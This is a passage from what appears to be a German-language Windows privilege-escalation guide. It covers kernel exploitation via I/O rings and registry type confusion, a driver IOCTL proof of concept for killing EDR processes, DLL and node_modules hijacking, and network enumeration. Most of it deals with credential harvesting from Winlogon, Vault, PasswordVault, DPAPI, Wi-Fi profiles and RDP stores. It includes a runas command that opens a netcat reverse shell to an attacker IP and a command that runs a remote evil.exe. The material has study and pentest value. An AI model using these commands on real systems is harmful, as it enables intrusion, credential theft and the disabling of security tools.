- **Geeignete Ziele mit vielen Zeigern**: Registrierte Buffer-Arrays von Windows-**I/O-Ringen** eignen sich hervorragend als Offenlegungsziele, da sich ihre Paged-Pool-Größe vom Angreifer kontrollieren lässt (`8 * regBufferCnt`) und jedes Element ein Kernel-Zeiger auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays, ermittle das umgebende `IORING_OBJECT` und beschädige anschließend **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-Ring-Operationen gefälschte Einträge des Angreifers verwenden und beliebiges Kernel-Read/Write ermöglichen. Wenn der einzige verfügbare Schreibzugriff ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Schreibzugriffe**, um einen User-Zeiger aus wiederholten Bytes wie `0x0101010101010101` zu erzeugen, ordne ihn mit `VirtualAlloc` zu und platziere das gefälschte Array registrierter Buffer dort.<sup>[[30]](#references)</sup>

Nützliche Hinweise beim Debuggen:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du über den beschädigten I/O-Ring beliebiges Kernel-Read/Write erlangt hast, stiehl mit dem standardmäßigen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Speicherbeschädigung von Registry-Hives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts zu erstellen, beschreibbare HKLM-/HKU-Nachfolger auszunutzen und Metadatenbeschädigungen ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Die vollständige Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Typverwechslung im Direct-Modus von `RtlQueryRegistryValues` durch vom Angreifer kontrollierte Pfade

Einige Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` auf, wobei das Ergebnis in einen skalaren Stack-Wert wie `int readValue` geschrieben wird. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` entsprechend dem **tatsächlichen** Registry-Typ interpretiert und nicht entsprechend dem vom Entwickler erwarteten Typ.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer ausgewählte Schlüssel abzufragen, deren Existenz über Rückgabecodes/Protokolleinträge offenzulegen und manchmal Werte auszulesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherbeschädigung**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder als Puffer mit festgelegter Größe fehlinterpretiert.

Praktische Hinweise zur Ausnutzung:

- **Schutzmaßnahme ab Windows 8**: Trifft die Abfrage auf einen **nicht vertrauenswürdigen Hive** und verwendet `RTL_QUERY_REGISTRY_DIRECT`, aber nicht `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` bereitzustellen.
- **Bereitstellung in einem vertrauenswürdigen Hive**: Verwende NtObjectManager, um beschreibbare Nachfolger von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity-Token** erneut aus, um Schlüssel zu finden, auf die aus Sandbox-Kontexten zugegriffen werden kann:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibvorgang über 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im Direct-Modus wird erwartet, dass `EntryContext` auf einen `UNICODE_STRING` zeigt. Lädt der Code zuerst ein vom Angreifer kontrolliertes `REG_DWORD` in einen skalaren Stack-Wert und verwendet denselben Puffer anschließend erneut für einen String-Lesevorgang, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst teilweise den `Buffer`-Zeiger. Das ermöglicht einen teilweise kontrollierten Kernel-Schreibvorgang.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der Direct-Modus den ersten `LONG` an `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesevorgang einen vom Angreifer kontrollierten **negativen** Wert im wiederverwendeten Skalar, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Dies ist oft der einfachste Weg, einen Callback-Zeiger vollständig zu überschreiben.

Effektives Suchmuster: **unterschiedliche Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, in denen der erste Registry-Lesevorgang bestimmt, ob ein zweiter erfolgt.

#### Fehlendes FILE_DEVICE_SECURE_OPEN bei Device-Objekten ausnutzen (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Device-Objekt mit einer strikten SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL beim Öffnen des Geräts über einen Pfad mit zusätzlicher Komponente nicht erzwungen. Dadurch kann jeder unprivilegierte Benutzer über einen Namespace-Pfad wie diesen ein Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulationen missbrauchen. In freier Wildbahn beobachtete Fähigkeiten:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränktes Lesen/Schreiben auf Raw-Disks (Offline-Manipulationen, Persistenztricks beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), sodass sich AV/EDR aus dem User Mode über den Kernel beenden lässt.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations for developers
- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.

Detection ideas for defenders
- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Berechtigungen erweitern**.<sup>[[2]](#references)</sup>

Überprüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie diese Prüfung ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js-/Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **Windows uncontrolled search path**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node sucht Pakete, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann diese Suche bis zum Laufwerksstamm gelangen. Daher kann eine Anwendung, die von `C:\Users\Administrator\project\app.js` aus gestartet wird, folgende Pfade prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen kann, kann er dort eine schädliche `foo.js`-Datei (oder einen Paketordner) ablegen und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht eine **LPE**, wenn das Ziel mit Administratorrechten, über eine erhöhte geplante Aufgabe/einen Service-Wrapper oder über eine automatisch gestartete privilegierte Desktop-App ausgeführt wird.

Das kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht erfolgreich installiert wurde
- der anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode liegt

### Anfällige Ziele aufspüren

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = Zieldatei (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Achte auf `NAME NOT FOUND` und den letzten erfolgreichen Zugriff unter `C:\node_modules`

Nützliche Muster bei der Code-Überprüfung entpackter `.asar`-Dateien oder von Anwendungsquellcode:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mit Procmon oder durch Überprüfung des Quellcodes.
2. Erstelle das Root-Suchverzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Lege ein Modul mit dem exakt erwarteten Namen ab:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Starte die Opferanwendung. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, kann Node `C:\node_modules\foo.js` laden.

Reale Beispiele für fehlende optionale Module, auf die dieses Muster zutrifft, sind `bluebird` und `utf-8-validate`. Die wiederverwendbare **Technik** besteht jedoch darin, nach einem beliebigen **fehlenden Bare Import** zu suchen, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennung und Härtung

- Alarmiere, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien bzw. Pakete ablegt.
- Suche nach Prozessen mit hoher Integrität, die auf `C:\node_modules\*` zugreifen.
- Bündle alle Laufzeitabhängigkeiten in der Produktion und überprüfe die Verwendung von `optionalDependencies`.
- Überprüfe Drittanbieter-Code auf stille Muster wie `try { require("...") } catch {}`.
- Deaktiviere optionale Prüfungen, sofern die Bibliothek dies unterstützt (bei einigen `ws`-Installationen lässt sich beispielsweise die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Suche in der hosts-Datei nach weiteren bekannten Computern, die fest eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **zugriffsbeschränkte Dienste**.

```bash
netstat -ano #Opened ports?
```

Für einen lokalen Listener sollten dessen PID, Prozessbesitzer, ausführbarer Pfad und der Dienst oder die geplante Aufgabe, die ihn startet, miteinander abgeglichen werden. Ein Fernsteuerungsdienst ermöglicht nur dann Zugriff als dessen Desktopbenutzer, wenn seine Authentifizierungs- und Befehlssteuerungen dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die unter einem Konto mit höheren Berechtigungen läuft, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Weg über eine Speicherbeschädigung eine Analyse genau dieser Binärdatei und der für sie erreichbaren Eingaben erfordert. Scheint ein offener Port zu einem Systemprozess zu gehören, sollte dies mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) abgeglichen werden, bevor der Backend-Dienst zugeordnet wird; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere[ Befehle zur Netzwerkerkennung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows-Subsystem für Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du Root-Rechte hast, kannst du auf jedem Port lauschen (beim ersten Einsatz von `nc.exe` zum Lauschen auf einem Port wirst du über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

Linux-`root` innerhalb von WSL gewährt für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, überprüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Anmeldedaten gespeichert wurden. Eine Rechteausweitung erfordert weiterhin ein gültiges Konto mit höheren Berechtigungen und einen zulässigen Authentifizierungsweg. Das Layout `LocalState\rootfs` gilt für ältere WSL-Installationen; bei WSL 2 wird die Distribution häufig in einer virtuellen Festplatte namens [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space) gespeichert. Ermittle daher zunächst die tatsächliche Distribution und den Speicherpfad. Vermeide es, Verlaufsinhalte bei der automatisierten Aufzählung auszugeben.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Zugangsdaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextbefund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Ansatzpunkt: [Sysinternals Autologon kann das Passwort als LSA secret speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Abfragen belegen weder, ob dieses Geheimnis existiert, noch ob es abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Credentials manager / Windows vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldedaten für Server, Websites und andere Programme, mit denen sich **Windows** **Benutzer automatisch anmelden** kann. Zunächst könnte es so klingen, als könnten Benutzer Anmeldedaten für Websites wie Facebook, Twitter oder Gmail speichern und sich dann automatisch in Browsern anmelden. So funktioniert es jedoch nicht.

Windows Vault speichert Anmeldedaten, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldedaten für den Zugriff auf eine Ressource** (einen Server oder eine Website) benötigt, **diesen Credential Manager** und Windows Vault verwenden und die bereitgestellten Anmeldedaten nutzen kann, anstatt dass Benutzer jedes Mal ihren Benutzernamen und ihr Passwort eingeben müssen.

Wenn die Anwendungen nicht mit dem Credential Manager interagieren, können sie meines Erachtens die Anmeldedaten für eine bestimmte Ressource nicht verwenden. Wenn deine Anwendung den Vault also nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldedaten für diese Ressource** aus dem Standardspeicher des Vaults anfordern.

Verwende `cmdkey`, um die gespeicherten Anmeldedaten auf dem Computer aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire-Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstoken und Klartextpasswörter im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist nach Sitzungen isoliert und kann nativ entschlüsselt werden, ohne dass Administratorrechte oder `SeDebugPrivilege` erforderlich sind.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter zu dumpen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird hauptsächlich innerhalb des Windows-Betriebssystems zur symmetrischen Verschlüsselung privater asymmetrischer Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, das wesentlich zur Entropie beiträgt.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Benutzerschlüssel werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der sich zusammen mit dem Hauptschlüssel zum Schutz der privaten Schlüssel des Benutzers in derselben Datei befindet**, besteht normalerweise aus 64 Byte zufälliger Daten. (Wichtig ist, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist. Daher kann sein Inhalt in CMD nicht mit dem Befehl `dir` aufgelistet werden, in PowerShell jedoch schon.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **durch das Masterpasswort geschützten Credential-Dateien** befinden sich normalerweise hier:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Du kannst das **mimikatz-Modul** `dpapi::cred` mit dem passenden `/masterkey` verwenden, um sie zu entschlüsseln.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele **DPAPI**-**masterkeys** aus dem **Speicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Credentials

**PowerShell-Credentials** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Credentials bequem zu speichern. Die Credentials sind mit **DPAPI** geschützt. Das bedeutet in der Regel, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Credential-Datei kann einen beliebigen Dateinamen oder einen `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventarisierung auf eine solche Datei verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` anzunehmen: [Windows kann Profile an anderen Speicherorten ablegen](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet ein verschlüsseltes Credential an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss separat über die erforderlichen Rechte für den vorgesehenen Dienst verfügen. Prüfe zuerst Pfade und ACLs, ohne bei der routinemäßigen Inventarisierung verschlüsselte oder unverschlüsselte Werte auszugeben.

Um PS-Credentials aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Zuletzt ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Remotedesktop-Anmeldeinformationsverwaltung**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwende das Mimikatz-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` kannst du **viele DPAPI-Masterkeys aus dem Arbeitsspeicher extrahieren**

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuche lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Benutzerordnern, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermittle das Verbindungsschema und die verschlüsselten `Password`-Attribute, bevor du eine XML-Datei als Hinweis auf Zugangsdaten einstufst. Der gespeicherte Wert ist kein DPAPI/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Master-Passwort verwendet wurde. Gib bei einer breiten Suche keine verschlüsselten Werte aus.

**Exporte von Remote Desktop Plus-Profilen** können ebenfalls in Benutzerordnern oder einem gemeinsam genutzten Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Betrachte ein nicht leeres Passwortelement als Hinweis auf Zugangsdaten, ohne es auszugeben oder anzunehmen, dass es im Klartext vorliegt: [laut Hersteller](https://www.donkz.nl/) kann der Profilschutz an das erstellende Konto und den Computer gebunden oder weniger strikt konfiguriert sein. Bestätige Herkunft und Wiederherstellungsbedingungen der Datei, bevor du dich darauf verlässt.

### Sticky Notes

Viele verwenden die Sticky Notes-App auf Windows-Arbeitsstationen, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass es sich dabei um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und sollte immer gesucht und untersucht werden.

Manchmal werden Passwörter und andere Informationen in Notiz-Apps gespeichert. Die paketierte Sticky Notes-App von Microsoft speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermittle die installierte App und das Speicherformat, bevor du eine fehlende SQLite-Datei als Beleg dafür wertest, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, enthält eine Kopie von `plum.sqlite` allein möglicherweise nicht die zuletzt bestätigten Notizen. Bewahre die passende `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und füge, falls vorhanden, auch `plum.sqlite-shm` hinzu; der Shared-Memory-Index kann neu erstellt werden, aber die WAL-Datei gehört zum dauerhaften Zustand der Datenbank. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein Hinweis auf Zugangsdaten: Überprüfe Konto, zulässigen Zugriff und Passwortwiederverwendung separat. Ein verschlüsselter Eintrag aus einem Passwort-Manager erfordert zusätzlich den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er als Nachweis für eine Anmeldung mit höheren Berechtigungen dienen kann.

### AppCmd.exe

**Beachte, dass du Administrator sein und mit einer hohen Integritätsstufe arbeiten musst, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) übernommen:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
